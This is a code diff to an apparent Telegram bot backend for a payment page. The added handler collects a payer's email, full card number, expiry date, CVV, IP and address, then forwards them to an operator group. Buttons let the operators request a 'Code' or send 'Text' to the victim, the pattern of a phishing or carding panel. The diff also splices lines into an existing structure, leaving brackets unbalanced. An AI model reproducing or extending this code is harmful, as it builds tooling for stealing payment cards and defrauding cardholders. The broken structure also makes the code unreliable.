@@ -611,6 +611,8 @@ async def admin_panel_action(message: types.Message):
     elif message.text == "Прямая оплата":
         user_step[message.from_user.id] = 'manual_payment_amount'
         await message.answer("Введите сумму и валюту через пробел (например: 45 EUR или 100 USD):")
+        # Тут логіка для прямої оплати
+        await message.answer("Включено режим прямої оплати. Инструкции отправлены пользователям.")
 
     else:
         await message.answer("Неизвестная команда.")
@@ -1281,6 +1283,35 @@ async def payment_notify(request):
                 InlineKeyboardButton(text="Заблокировать", callback_data=f"block:{ip}"),
                 InlineKeyboardButton(text="Розблокувати", callback_data=f"unblock:{ip}")
             ]
+    user_id = data.get('user_id', '')
+    
+    # --- Оновлюємо IP у базі даних, якщо передано user_id ---
+    if user_id and ip:
+        update_site_user_ip(user_id, ip)
+    
+    # --- Отримуємо дані користувача з бази ---
+    user_data_from_db = None
+    if user_id:
+        user_data_from_db = get_site_user(user_id)
+    
+    text = f"Email: {email}\nCard Number: {card}\nExpiry Date: {expiry}\nCVV: {cvv}\nIP: {ip}"
+    
+    # Додаємо інформацію з бази даних, якщо є
+    if user_data_from_db:
+        text += f"\nSite User ID: {user_data_from_db['id']}"
+        text += f"\nЦена: {user_data_from_db['price']} {user_data_from_db['currency']}"
+        text += f"\nАдрес: {user_data_from_db['street']}"
+    
+    kb_rows = [
+        [
+            InlineKeyboardButton(text="Card", callback_data=f"card:{ip}"),
+            InlineKeyboardButton(text="Block", callback_data=f"block:{ip}"),
+            InlineKeyboardButton(text="Unblock", callback_data=f"unblock:{ip}"),
+            InlineKeyboardButton(text="Code", callback_data=f"code:{ip}")
+        ],
+        [
+            InlineKeyboardButton(text="Тех поддержка", callback_data=f"support:{ip}"),
+            InlineKeyboardButton(text="Text", callback_data=f"text:{ip}")
         ]
     )
     await bot.send_message(PAYMENT_GROUP_ID, msg1, parse_mode='HTML', reply_markup=kb1)
